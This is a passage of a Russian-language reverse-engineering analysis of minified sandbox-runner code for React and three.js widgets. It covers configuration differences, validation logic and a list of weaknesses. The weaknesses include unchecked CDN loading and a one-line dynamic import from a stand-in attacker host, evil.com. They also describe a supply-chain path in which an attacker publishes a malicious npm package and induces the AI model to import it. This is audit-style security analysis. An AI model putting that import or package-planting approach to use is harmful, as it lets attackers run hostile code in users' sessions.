      transformPosition: null,
      expectReadySignal: !0,
      measureHeight: !1,
      measureWidth: !1,
      enableExternalNavigationGating: r,
      allowPopups: o,
      onIframeReady: ({viewWindow: l}) => t.startRenderSpan(l)
    })) {
      i.type === f.ERROR &&
        (a = {errorSource: i.errorSource ?? "runtime", errorType: i.error.name ?? "unknown"});
      i.type === f.ENVIRONMENT_STATUS && i.status === _.RUNNING_CODE && t.succeed();
      i.type === f.RUN_COMPLETE && i.wasFatalError &&
        t.fail(a ?? {errorSource: "runtime", errorType: "fatal_runtime_error"});
      yield i;
    }
  } catch (i) {
    throw t.fail({errorSource: "runtime", errorType: D(i)}), i;
  } finally {
    t.cancel();
  }
}
```

**Отличия от `runReact`:**

| | `runReact` | `runThree` |
|---|---|---|
| `measureHeight` | `true` | **`false`** |
| `measureWidth` | `false` | `false` |
| `expectReadySignal` | `true` | `true` |
| `additionalGlobals` | пробрасывает | **нет** |
| `id` | пробрасывает | **нет** |
| События | `INITIALIZING` + `INSTALLING_PACKAGES` | только `INITIALIZING` |
| Метрики | размер | TBT, render time, outcome |
| `onIframeReady` | нет | **есть** |

**`measureHeight: false`** — three.js-виджет не измеряет высоту. Он
растягивается на `100%` (см. `html,body{width:100%;height:100%}`).

**`onIframeReady`** — запускает `PerformanceObserver` в окне iframe.

**Только `INITIALIZING`** — без `INSTALLING_PACKAGES`, потому что three.js
грузится через `importmap` при первом `import`, а не заранее.

---

# ЧАСТЬ 4. `validate-react-ByR8Hv0v.js`

## 4.1 Полный код

```js
import {r as m, M as t, E as f} from "./main-BR1bOQyH.js";
import {g as p} from "./get-html-D9pLuxCy.js";
import {t as u} from "./transpile-Cld0n4VL.js";

async function y(a, s, o) {
  const {transpiledCode: n, css: i} = await u({sandboxLogger: a, code: s, id: o}),
        {html: l} = p({transpiledCode: n, css: i});
  let r = null;

  return Promise.resolve().then(async () => {
    for await (const e of m({
      html: l,
      sandboxLogger: a,
      transformPosition: null,
      expectReadySignal: !0,
      measureWidth: !1,
      measureHeight: !1,
      enableExternalNavigationGating: !0,
      allowPopups: !1
    })) {
      if (e.type === t.ENVIRONMENT_STATUS && e.status === f.RUNNING_CODE) return;
      if (e.type === t.ERROR) r = e.error;
      else if (e.type === t.RUN_COMPLETE && e.wasFatalError) throw r
    }
  })
}

export {y as validateReact};
```

## 4.2 Отличия от `runReact`

| Параметр | `runReact` | `validateReact` |
|---|---|---|
| `expectReadySignal` | `true` | `true` |
| `measureHeight` | `true` | **`false`** |
| `measureWidth` | `false` | `false` |
| `enableExternalNavigationGating` | из параметров | **`true` (жёстко)** |
| `allowPopups` | `true` (по умолчанию) | **`false` (жёстко)** |
| `transformPosition` | sourcemap-трансформер | `null` |
| `additionalGlobals` | пробрасывает | **нет** |

**`allowPopups: false`** — при валидации попапы запрещены. `runHTMLAsync`
в этом случае ставит `sandbox="allow-scripts allow-same-origin"` — **без**
`allow-popups`, `allow-forms`.

**`enableExternalNavigationGating: true`** — все переходы перехватываются.

**То есть валидация запускает код в более строгой песочнице**, чем показ.

## 4.3 Логика

```js
if (e.type === t.ENVIRONMENT_STATUS && e.status === f.RUNNING_CODE) return;
```
**Успех** — как только код запустился (`RUNNING_CODE`), выходим. Не ждём
полного прогрева.

```js
if (e.type === t.ERROR) r = e.error;
```
Запоминаем ошибку.

```js
else if (e.type === t.RUN_COMPLETE && e.wasFatalError) throw r
```
Если завершилось фатально — бросаем сохранённую ошибку.

**`throw r`** — если `r` = `null` (не было `ERROR`-события), бросит `null`.
Тогда `parseAndLogTranspileError(logger, null)` → `null instanceof Error` →
`false` → метрика `"unknown"` → вернёт `null`.

## 4.4 Зачем нужен

Вызывается из фасада `validate(t, e)`:

```js
async validate(t, e) {
  const n = new rt;
  try {
    const {validateReact: r} = await _t(...);
    return await r(n, t, e), !0;      // → true при успехе
  } catch (r) {
    const {parseAndLogTranspileError: o} = await _t(...);
    return o(n, r) ?? !1;
  }
}
```

**Результат:**
- успех → `true`
- ошибка → `{name, line, message, stack}` (truthy)
- не-Error ошибка → `false`

---

# ЧАСТЬ 5. Сравнительная таблица раннеров

| Свойство | `runReact` | `runThree` | `validateReact` |
|---|---|---|---|
| Транспиляция | ✅ (esbuild+babel+tailwind) | ❌ | ✅ |
| `getHtml` | ✅ | свой шаблон | ✅ |
| `expectReadySignal` | `true` | `true` | `true` |
| `measureHeight` | `true` | `false` | `false` |
| `measureWidth` | `false` | `false` | `false` |
| `allowPopups` | параметр | параметр | **`false`** |
| `enableExternalNavigationGating` | параметр | параметр | **`true`** |
| `additionalGlobals` | ✅ | ❌ | ❌ |
| `transformPosition` | ✅ | `null` | `null` |
| Метрики | размер | TBT, время, outcome | — |
| События | INIT + INSTALL + RUNNING | INIT + RUNNING | INIT + RUNNING |
| Версия библиотеки | React 18.3.1 (вшит) | three 0.179.1 (unpkg) | React 18.3.1 |

---

# ЧАСТЬ 6. Слабые места

## 6.1 `run-react`

### 1. Двойной `RUN_COMPLETE` при ошибке транспиляции

```js
} catch (T) {
  ...
  yield {type: Ce.RUN_COMPLETE, duration: null, wasCancelled: !1, wasFatalError: !0};
  // ← нет return
}

if (D.timeEnd("react.transpile"), _ == null) {
  ...
  yield {type: Ce.RUN_COMPLETE, duration: null, wasCancelled: !1, wasFatalError: !0};
}
```

**`_` остался `null`** → второй `yield RUN_COMPLETE`.

**Последствие:** хост получает два события завершения.

### 2. `INITIALIZING` + `INSTALLING_PACKAGES` врут

Для React ничего не устанавливается — идёт транспиляция. UI говорит
«Устанавливаем пакеты».

### 3. Любой npm-пакет грузится с jsdelivr

```js
x.onResolve({filter: /^[^./]/}, ({path: D}) => {
  const g = Aee(D);
  return {path: RB(`${Eee}/npm/${g}/+esm`), namespace: "external"}
});
```

**`import x from "любой-пакет"`** → `https://cdn.jsdelivr.net/npm/любой-пакет/+esm`
→ загружается и **выполняется**.

CSP разрешает `cdn.jsdelivr.net` в `script-src`. Значит любой пакет,
опубликованный на npm, будет исполнен в виджете.

**Вектор:** злоумышленник публикует пакет с полезной нагрузкой, убеждает
модель его использовать (или модель сама угадывает имя). Код исполняется
на `web-sandbox.oaiusercontent.com`.

### 4. `esbuild-wasm` с CDN без SRI

```js
const D = [
  `https://cdn.jsdelivr.net/npm/esbuild-wasm@${fZ}/esbuild.wasm`,
  `https://unpkg.com/esbuild-wasm@${fZ}/esbuild.wasm`
];
pZ.initialize({wasmURL: f, worker: x})
```

**Нет `integrity`.** Если jsdelivr/unpkg скомпрометированы — выполнится
подменённый WASM.

### 5. `@babel/standalone` вшит, но `filename` всегда `.tsx`

```js
wB.transform(x, {filename: "index.tsx", ...})
```

Пользователь пишет `.js`-код, но парсится как TypeScript. `let x: number = 1`
пройдёт. `interface Foo {}` пройдёт. Потом esbuild с `loader: "tsx"` тоже съест.

**Побочный эффект:** нельзя отловить «это JS, а не TS» — всё принимается.

### 6. Tailwind-wasm сериализуется мьютексом

```js
return A || pJe.runExclusive(async () => { ... })
```

**`runExclusive`** — один запуск за раз. При многих виджетах — очередь.
Если один завис — все ждут.

## 6.2 `run-three`

### 1. Версия three из unpkg

```js
"three": "https://unpkg.com/three@0.179.1/build/three.module.js"
```

**Без SRI.** unpkg — CDN, но не гарантия целостности.

### 2. `importmap` не ограничен

Пользователь может добавить свой `importmap`? Нет — он в шаблоне.
Но **код пользователя может** `import("https://evil.com/x.js")` —
динамический импорт не проходит через importmap.

CSP `script-src` включает `https://unpkg.com`, но не `evil.com`.

### 3. `data-ready` через один rAF

```js
requestAnimationFrame(() => {
  document.documentElement.setAttribute("data-ready", "");
});
```

Если сцена тяжёлая — first frame может ещё не отрисоваться. В React
двойной rAF, здесь одинарный.

**Последствие:** `measureHeight: false`, так что это некритично. Но
`RUNNING_CODE` может прийти раньше фактической отрисовки.

### 4. `code` без извлечения из HTML, если это не скрипт

```js
function g(e) {
  const n = e.match(/<script\b[^>]*type=["']module["'][^>]*>([\s\S]*?)<\/script>/i);
  if (n?.[1] != null) return n[1].trim();
  const r = e.match(/<script\b[^>]*>([\s\S]*?)<\/script>/i);
  return r?.[1] != null ? r[1].trim() : e.trim();
}
```

Если пользователь дал **полный HTML** с тремя скриптами — возьмётся
**только первый**. Остальные потеряются.

### 5. Метрики в iframe

```js
startRenderSpan: u => {
  const c = u.PerformanceObserver, m = c?.supportedEntryTypes;
```

**`u`** — `viewWindow` iframe. `PerformanceObserver` берётся из **него**.
Но `longtask` в iframe может быть недоступен (зависит от браузера).

## 6.3 `validate-react`

### 1. `throw null`

```js
let r = null;
...
else if (e.type === t.RUN_COMPLETE && e.wasFatalError) throw r
```

Если `ERROR`-событие не пришло, но `wasFatalError = true` — бросит `null`.

**Дальше:** `parseAndLogTranspileError(logger, null)` → `null instanceof Error` = `false` → `null`.

**Итог:** `validate` вернёт `null`, а не `false`. `null ?? false` → `false`. Ок.

### 2. Валидация не ждёт рендера

```js
if (e.type === t.ENVIRONMENT_STATUS && e.status === f.RUNNING_CODE) return;
```

Как только `RUNNING_CODE` — выходим. Ошибки, возникшие **после** старта
рендера, не отлавливаются.

**То есть `validate` проверяет только транспиляцию и старт, не работу.**

---

# ЧАСТЬ 7. Итог

## 7.1 Цепочка React целиком

```
Пользователь пишет JSX
  │
  ├─ babel.transform() — парсинг TS/JSX → AST
  ├─ generateShadcnImportBlock(ast) — какие компоненты нужны
  │   └─ добавить импорты в начало кода
  ├─ tailwindcss-oxide (WASM) — сгенерировать CSS для классов
  ├─ esbuild.context({bundle, format: esm, jsx: automatic})
  │   ├─ onResolve: index.js → внутренний
  │   ├─ onResolve: @/components/ui/* → внутренние (из AB)
  │   ├─ onResolve: пакеты → https://cdn.jsdelivr.net/npm/<pkg>/+esm
  │   ├─ onLoad: fetch() с CDN
  │   └─ rebuild() → bundle.js + bundle.js.map
  ├─ getHtml({transpiledCode, css})
  ├─ Qe() — трансформер позиций
  └─ runHTMLAsync({html, expectReadySignal: true})
      ├─ iframe.sandbox = "allow-scripts allow-same-origin allow-popups ..."
      ├─ document.write(html)
      ├─ MutationObserver → data-ready
      └─ yield RUNNING_CODE
```

## 7.2 Ключевые числа

| Что | Значение |
|---|---|
| esbuild-wasm | 0.24.2 |
| React (вшит) | 18.3.1 |
| three.js (unpkg) | 0.179.1 |
| Recharts (вшит) | 3.8.1 |
| `@react-three/fiber` | 8.17.7 |
| TBT-порог | 50 мс |
| CDN для WASM | jsdelivr → unpkg |

## 7.3 Главное

**1. `run-react` — единственный раннер с полной цепочкой сборки.**
babel → shadcn → tailwind → esbuild → getHtml → iframe.

**2. Любой npm-пакет исполняется.**
`import x from "pkg"` → `cdn.jsdelivr.net/npm/pkg/+esm` → выполнение.
CSP это разрешает.

**3. `run-three` проще: шаблон + importmap.**
Никакой транспиляции. three.js с unpkg по importmap.

**4. `validate-react` — та же цепочка, но без показа.**
`allowPopups: false` + `enableExternalNavigationGating: true` — строже.

**5. Двойной `RUN_COMPLETE` при ошибке транспиляции в `run-react`.**
Баг, который может сломать хост.

**6. Tailwind генерируется на WASM в мьютексе.**
1.7 МБ (`tailwindcss_oxide_bg-DaSLdPNK.wasm`), не потокобезопасен.
